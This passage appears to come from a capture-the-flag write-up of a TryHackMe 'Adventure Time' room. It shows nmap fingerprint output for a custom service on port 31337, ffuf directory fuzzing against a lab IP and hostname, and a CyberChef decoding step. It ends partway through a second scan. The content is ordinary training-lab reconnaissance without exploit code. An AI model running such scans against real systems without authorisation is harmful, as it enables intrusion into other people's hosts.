&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> DNSVersionBindReqTCP:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> version
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="nb">bind&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> GenericLines, NULL:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> GetRequest:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not GET / HTTP/1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTPOptions:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not OPTIONS / HTTP/1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Help:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not HELP
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> RTSPRequest:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not OPTIONS / RTSP/1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> SIPOptions:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Hello Princess Bubblegum. What is the magic word?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> magic word is not OPTIONS sip:nm SIP/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Via: SIP/2.0/TCP nm&lt;span class="p">;&lt;/span>&lt;span class="nv">branch&lt;/span>&lt;span class="o">=&lt;/span>foo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> From: &amp;lt;sip:nm@nm&amp;gt;&lt;span class="p">;&lt;/span>&lt;span class="nv">tag&lt;/span>&lt;span class="o">=&lt;/span>root
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;sip:nm2@nm2&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Call-ID: &lt;span class="m">50000&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> CSeq: &lt;span class="m">42&lt;/span> OPTIONS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Max-Forwards: &lt;span class="m">70&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Length: &lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Contact: &amp;lt;sip:nm@nm&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Accept: application/sdp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="m">1&lt;/span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF-Port31337-TCP:V&lt;span class="o">=&lt;/span>7.94SVN%I&lt;span class="o">=&lt;/span>7%D&lt;span class="o">=&lt;/span>1/8%Time&lt;span class="o">=&lt;/span>659C452A%P&lt;span class="o">=&lt;/span>x86_64-pc-linux-gnu%r
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF:&lt;span class="o">(&lt;/span>NULL,32,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magi
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:c\x20word\?\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>GetRequest,57,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20Wh
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:at\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20word\x20is\x20not\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20GET\x20/\x20HTTP/1\.0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>SIPOptions,124,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubb
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:legum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20word\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20is\x20not\x20OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x2
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:0nm;branch=foo\r\nFrom:\x20&amp;lt;sip:nm@nm&amp;gt;;tag=root\r\nTo:\x20&amp;lt;sip:nm2@nm2&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\r\nCall-ID:\x2050000\r\nCSeq:\x2042\x20OPTIONS\r\nMax-Forwards:\x2070\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:r\nContent-Length:\x200\r\nContact:\x20&amp;lt;sip:nm@nm&amp;gt;\r\nAccept:\x20applic
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:ation/sdp\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>GenericLines,32,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20Wh
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:at\x20is\x20the\x20magic\x20word\?\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>HTTPOptions,5B,&lt;span class="s2">&amp;#34;Hello\x20Princ
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:ess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magi
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:c\x20word\x20is\x20not\x20OPTIONS\x20/\x20HTTP/1\.0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>RTSPRequest,5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF:B,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20wo
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:rd\?\nThe\x20magic\x20word\x20is\x20not\x20OPTIONS\x20/\x20RTSP/1\.0\n&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SF:&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>RPCCheck,75,&lt;span class="s2">&amp;#34;Hello\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:x20magic\x20word\?\nThe\x20magic\x20word\x20is\x20not\x20\x80\0\0\(r\xf
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:e\x1d\x13\0\0\0\0\0\0\0\x02\0\x01\x86\xa0\0\x01\x97\|\0\0\0\0\0\0\0\0\0
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\0\0\0\0\0\0\0\0\0\0\0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>DNSVersionBindReqTCP,69,&lt;span class="s2">&amp;#34;Hello\x20Princess
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20word\x20is\x20not\x20\0\x1e\0\x06\x01\0\0\x01\0\0\0\0\0\0\x07version\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:x04bind\0\0\x10\0\x03\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>DNSStatusRequestTCP,57,&lt;span class="s2">&amp;#34;Hello\x20Princess\x
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nThe\x20magic\x20
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:word\x20is\x20not\x20\0\x0c\0\0\x10\0\0\0\0\0\0\0\0\0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>Help,4D,&lt;span class="s2">&amp;#34;He
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:llo\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:nThe\x20magic\x20word\x20is\x20not\x20HELP\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>%r&lt;span class="o">(&lt;/span>SSLSessionReq,A1,&lt;span class="s2">&amp;#34;Hell
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:o\x20Princess\x20Bubblegum\.\x20What\x20is\x20the\x20magic\x20word\?\nT
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:he\x20magic\x20word\x20is\x20not\x20\x16\x03\0\0S\x01\0\0O\x03\0\?G\xd7
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\xf7\xba,\xee\xea\xb2`~\xf3\0\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:&amp;lt;=\xdbo\xef\x10n\0\0\(\0\x16\0\x13\0\n\0f\0\x05\0\x04\0e\0d\0c\0b\0a\0`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">SF:\0\x15\0\x12\0\t\0\x14\0\x11\0\x08\0\x06\0\x03\x01\0\n&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: 127.0.1.1&lt;span class="p">;&lt;/span> OSs: Unix, Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap &lt;span class="k">done&lt;/span>: &lt;span class="m">1&lt;/span> IP address &lt;span class="o">(&lt;/span>&lt;span class="m">1&lt;/span> host up&lt;span class="o">)&lt;/span> scanned in 162.12 seconds
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We see that we have a ftp server with some images in it.&lt;/p>
&lt;p>I downloaded them and tried to upload a file, but it didn’t work out, so I am going to explore the web page.&lt;/p>
&lt;p>In the http page there is nothing of interest, but in the https page there is a subdirectory that we can look for:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://10.10.237.150:443/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://10.10.237.150:443/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Priority ordered case insensative list, where entries were found [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 65ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 63ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 66ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 64ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 60ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># on atleast 2 different hosts [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 59ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 62ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 331ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 216, Words: 30, Lines: 12, Duration: 61ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">candybar &lt;span class="o">[&lt;/span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 66ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And we got a message:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We can decypher with cyberchef:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/AdventureTime-writeup-THM/main/2156d084-f7ce-479d-b8c4-098ec653c1ed_Export-8951dd85-c9ac-4f1a-82d6-6f0da607c4ac/Adventure%20Time%2044bd355551e24dd4bbf6c95c363d0634/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>From there we can find this email address: &lt;a class="link" href="mailto:bubblegum@land-of-ooo.com" >bubblegum@land-of-ooo.com&lt;/a>, which we should put in the hosts file.&lt;/p>
&lt;p>Now that we found jake we should re-enumerate the website:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u https://land-of-ooo.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : https://land-of-ooo.com/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># directory-list-lowercase-2.3-medium.txt [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 56ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># This work is licensed under the Creative Commons [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 55ms]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># [Status: 200, Size: 212, Words: 29, Lines: 12, Duration: 54ms]&lt;/span>
